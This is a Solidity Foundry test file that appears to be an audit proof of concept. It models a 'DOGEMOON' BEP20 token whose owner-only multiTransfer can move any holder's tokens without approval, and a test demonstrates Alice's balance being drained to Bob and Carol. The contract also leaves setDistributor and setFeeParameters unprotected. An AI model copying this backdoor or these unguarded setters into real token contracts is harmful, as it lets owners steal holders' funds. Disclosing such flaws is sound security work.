// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

abstract contract Auth {
    address public owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) { return account == owner; }
}

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract MockRouter is IDEXRouter {
    function factory() external pure override returns (address) {
        return address(0);
    }
    
    function WETH() external pure override returns (address) {
        return address(0);
    }
}

contract DOGEMOON is IBEP20, Auth {
    address public routerAddress;
    address public pair;
    mapping(address => uint256) private _balances;
    mapping(address => bool) public isDividendExempt;
    address public distributor;
    uint256 public reflectionFee;
    uint256 public distributorGas;
    
    constructor() Auth(msg.sender) {
        // Mock router setup to avoid external calls
        routerAddress = address(new MockRouter());
        pair = address(0);
        _balances[msg.sender] = 1_000_000 * 10**decimals();
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function setDistributor(address _distributor) external {
        distributor = _distributor;
    }
    
    function setFeeParameters(uint256 _reflectionFee, uint256 _distributorGas) external {
        reflectionFee = _reflectionFee;
        distributorGas = _distributorGas;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        return true;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _basicTransfer(msg.sender, recipient, amount);
    }
    
    function decimals() public view override returns (uint8) {
        return 9;
    }
    
    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
        require(addresses.length < 501,"GAS Error");
        require(addresses.length == tokens.length,"Mismatch");
        uint256 totalAmount;
        for(uint i; i < tokens.length; i++){
            totalAmount += tokens[i];
        }
        require(balanceOf(from) >= totalAmount, "Not enough tokens");
        for(uint i; i < addresses.length; i++){
            _basicTransfer(from, addresses[i], tokens[i]);
        }
    }
}

contract OwnerTransferTest is Test {
    DOGEMOON token;
    address owner = address(0x1);
    address alice = address(0x2);
    address bob = address(0x3);
    address carol = address(0x4);

    function setUp() public {
        vm.startPrank(owner);
        token = new DOGEMOON();
        token.transfer(alice, 1000 * 10 ** token.decimals()); 
        vm.stopPrank();
    }

    function testOwnerCanTransferUserTokens() public {
        uint256 oneToken = 10 ** token.decimals();
        uint256 aliceInitialBalance = token.balanceOf(alice);
        uint256 bobInitialBalance = token.balanceOf(bob);
        uint256 carolInitialBalance = token.balanceOf(carol);
        
        console.log("--- BEFORE-Trigger MultiTransfer ---");
        console.log("Alice balance BEFORE:", aliceInitialBalance);
        console.log("Bob balance BEFORE:", bobInitialBalance);
        console.log("Carol balance BEFORE:", carolInitialBalance);
        
        vm.startPrank(owner);
        console.log("--- Trigger MultiTransfer ---");
        address[] memory recipients = new address[](2);
        recipients[0] = bob;
        recipients[1] = carol;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 500 * oneToken;
        amounts[1] = 500 * oneToken;
        token.multiTransfer(alice, recipients, amounts);
        vm.stopPrank(); 
        
        uint256 aliceBalanceAfter = token.balanceOf(alice);
        uint256 bobBalanceAfter = token.balanceOf(bob);
        uint256 carolBalanceAfter = token.balanceOf(carol);
        
        console.log("--- AFTER-Trigger MultiTransfer ---");
        console.log("Alice balance AFTER:", aliceBalanceAfter);
        console.log("Bob balance AFTER:", bobBalanceAfter);
        console.log("Carol balance AFTER:", carolBalanceAfter);
        
        bool vulnerabilityExploited = (aliceBalanceAfter == 0) && 
                                      (bobBalanceAfter == 500 * oneToken) && 
                                      (carolBalanceAfter == 500 * oneToken);
        
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Owner transferred 1000 tokens from Alice without approval");
        } else {
            console.log("Vulnerability not Exist: Token balances remain unchanged post-transfer");
        }
        
        assertEq(token.balanceOf(alice), 0, "Alice tokens not transferred");
        assertEq(token.balanceOf(bob), 500 * oneToken, "Bob did not receive tokens");
        assertEq(token.balanceOf(carol), 500 * oneToken, "Carol did not receive tokens");
    }
}